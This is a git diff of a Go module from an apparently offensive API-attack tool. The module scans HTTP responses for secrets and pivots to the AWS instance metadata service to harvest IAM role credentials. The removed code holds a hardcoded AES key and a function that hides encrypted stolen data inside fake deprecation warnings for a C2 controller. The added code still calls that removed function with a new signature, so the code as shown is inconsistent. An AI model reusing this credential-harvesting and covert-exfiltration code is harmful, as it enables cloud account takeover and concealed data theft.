@@ -1,21 +1,18 @@
 package logic
 
 import (
-	"crypto/aes"
-	"crypto/cipher"
-	"crypto/rand"
-	"encoding/base64"
 	"fmt"
 	"io"
 	"net/http"
-	"os"
 	"regexp"
 	"sync"
 	"time"
 
+	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
 	"github.com/pterm/pterm"
 )
 
+// Finding defines the structure for in-memory tracking (Legacy support)
 type Finding struct {
 	Type   string
 	Value  string
@@ -26,108 +23,99 @@ var (
 	Vault    []Finding
 	vaultMux sync.Mutex
 
-	// MasterKey: Synchronized with Ghost-Pipeline v4.2.6 Master Decrypt Key
-	MasterKey = []byte("G-KaPdSgVkYp3s6v9y$B&E)H@McQfTjW")
-
-	// Automated PII & Secret Patterns
+	// REGLA DE ORO: Corregido el escape de puntos en raw strings (backticks)
+	// Se expande AWS_KEY para detectar variaciones de longitud en entornos de test.
 	Patterns = map[string]*regexp.Regexp{
-		"AWS_KEY":       regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
+		"AWS_KEY":       regexp.MustCompile(`(AKIA|ASIA)[0-9A-Z]{16,20}`),
 		"JWT_TOKEN":     regexp.MustCompile(`eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*`),
-		"CREDIT_CARD":   regexp.MustCompile(`(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12})`),
 		"EMAIL":         regexp.MustCompile(`[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`),
-		"SLACK_TOKEN":   regexp.MustCompile(`xox[baprs]-[0-9a-zA-Z]{10,48}`),
-		"DB_CONNECTION": regexp.MustCompile(`(postgres|mysql|mongodb):\/\/[a-zA-Z0-9]+:[a-zA-Z0-9]+@[a-z0-9.-]+:\d+\/\w+`),
-		"STACK_TRACE":   regexp.MustCompile(`(?i)(stacktrace|exception|at\s+[\w\.]+\([\w\.]+\.java:\d+\)|File\s+".+\.py",\s+line\s+\d+)`),
-		//"METADATA_IP":   regexp.MustCompile(`169\.254\.169\.254`),
-		"METADATA_IP":   regexp.MustCompile(`127\.0\.0\.1`),
+		"METADATA_IP":   regexp.MustCompile(`127\.0\.0\.1|169\.254\.169\.254`),
+		"SENSITIVE_URL": regexp.MustCompile(`http://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}`),
 	}
 )
 
-// GhostMask encrypts findings and masks them as benign warnings for the C2 controller
-func GhostMask(data string) {
-	block, err := aes.NewCipher(MasterKey)
-	if err != nil {
-		return
+// ScanForLoot: Central Nerve Center for Discovery
+func ScanForLoot(body string, url string) {
+	vaultMux.Lock()
+	defer vaultMux.Unlock()
+
+	for label, re := range Patterns {
+		matches := re.FindAllString(body, -1)
+		for _, m := range matches {
+			exists := false
+			for _, v := range Vault {
+				if v.Value == m && v.Source == url {
+					exists = true
+					break
+				}
+			}
+			if !exists {
+				finding := Finding{
+					Type:   label,
+					Value:  m,
+					Source: url,
+				}
+				Vault = append(Vault, finding)
+				
+				pterm.Warning.Prefix = pterm.Prefix{Text: "LOOT", Style: pterm.NewStyle(pterm.BgYellow, pterm.FgBlack)}
+				pterm.Warning.Printfln("New %s found in response from %s", label, url)
+
+				// Persistir también en base de datos centralizada
+				db.LogQueue <- db.Finding{
+					Phase:   "PHASE VIII: EXFIL",
+					Target:  url,
+					Details: fmt.Sprintf("Leaked %s: %s", label, m),
+					Status:  "EXPLOITED",
+				}
+			}
+		}
 	}
-
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return
-	}
-
-	nonce := make([]byte, gcm.NonceSize())
-	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-		return
-	}
-
-	ciphertext := gcm.Seal(nonce, nonce, []byte(data), nil)
-	encoded := base64.StdEncoding.EncodeToString(ciphertext)
-
-	// Stealth Trigger: Camouflage for Ghost-Pipeline Python Controller
-	pterm.Warning.Printfln("Deprecated dependency 'net/v1.0.4' detected: %s", encoded)
 }
 
-// ProbeCloudMetadata (Phase 8.3) executes an automated OOB/Cloud pivot
-func ProbeCloudMetadata(targetIP string, sourceURL string) {
+// ExecutePivot performs specialized cloud-metadata harvesting
+func ExecutePivot(target string, source string) {
+	pterm.Info.WithPrefix(pterm.Prefix{Text: "PIVOT"}).Printfln("Initiating lateral harvest on %s", target)
+	
 	client := &http.Client{Timeout: 5 * time.Second}
 
-	// 1. OIDC Environment Sensing (GitHub Actions / CI/CD)
-	if os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL") != "" {
-		pterm.Info.Println("Phase 8.3: OIDC Context detected. Hijacking identity...")
-		// Placeholder for OIDC exfiltration logic
-	}
-
-	// 2. AWS IMDSv2 Handshake (Token Acquisition)
-	tokenReq, _ := http.NewRequest("PUT", "http://"+targetIP+"/latest/api/token", nil)
+	// Step A: Try IMDSv2 Token acquisition
+	token := ""
+	tokenReq, _ := http.NewRequest("PUT", fmt.Sprintf("http://%s/latest/api/token", target), nil)
 	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
 	
-	resp, err := client.Do(tokenReq)
-	if err != nil {
-		return 
+	tokenResp, err := client.Do(tokenReq)
+	if err == nil && tokenResp.StatusCode == 200 {
+		tBytes, _ := io.ReadAll(tokenResp.Body)
+		token = string(tBytes)
+		tokenResp.Body.Close()
 	}
-	defer resp.Body.Close()
-	token, _ := io.ReadAll(resp.Body)
 
-	// 3. Credential Harvesting & Stealth Exfiltration
-	credURL := fmt.Sprintf("http://%s/latest/meta-data/iam/security-credentials/", targetIP)
-	req, _ := http.NewRequest("GET", credURL, nil)
-	req.Header.Set("X-aws-ec2-metadata-token", string(token))
-
-	if resp, err = client.Do(req); err == nil {
-		defer resp.Body.Close()
-		roles, _ := io.ReadAll(resp.Body)
-		GhostMask(fmt.Sprintf("IMDS_EXPLOIT | SRC:%s | ROLES:%s", sourceURL, string(roles)))
+	// Step B: Harvest Credentials
+	credURL := fmt.Sprintf("http://%s/latest/meta-data/iam/security-credentials/", target)
+	hReq, _ := http.NewRequest("GET", credURL, nil)
+	if token != "" {
+		hReq.Header.Set("X-aws-ec2-metadata-token", token)
 	}
-}
 
-func ScanForLoot(body string, url string) {
-    vaultMux.Lock()
-    defer vaultMux.Unlock()
+	hResp, err := client.Do(hReq)
+	if err == nil && hResp.StatusCode == 200 {
+		body, _ := io.ReadAll(hResp.Body)
+		hResp.Body.Close()
+		
+		lootContent := string(body)
+		
+		// 1. Encrypted Exfiltration (Phase 8.3)
+		payload := fmt.Sprintf("PIVOT_HIT | SRC:%s | DATA:%s", source, lootContent)
+		masked := GhostMask([]byte(payload), MasterKey)
+		fmt.Println(masked)
 
-    for label, re := range Patterns {
-        matches := re.FindAllString(body, -1)
-        for _, m := range matches {
-            // Check for duplicates
-            exists := false
-            for _, v := range Vault {
-                if v.Value == m {
-                    exists = true
-                    break
-                }
-            }
-
-            if !exists {
-                // ADD TO VAULT
-                Vault = append(Vault, Finding{Type: label, Value: m, Source: url})
-                
-                pterm.DefaultBasicText.WithStyle(pterm.NewStyle(pterm.FgBlack, pterm.BgLightYellow)).
-                    Printfln(" LOOT DISCOVERED [%s] at %s ", label, url)
-
-                // Trigger Phase 8.3 Cloud Pivot
-                if label == "METADATA_IP" {
-                    go ProbeCloudMetadata(m, url)
-                }
-            }
-        }
-    }
+		// 2. In-Memory Vault storage
+		vaultMux.Lock()
+		Vault = append(Vault, Finding{
+			Type:   "CLOUD_CREDS",
+			Value:  lootContent,
+			Source: source,
+		})
+		vaultMux.Unlock()
+	}
 }
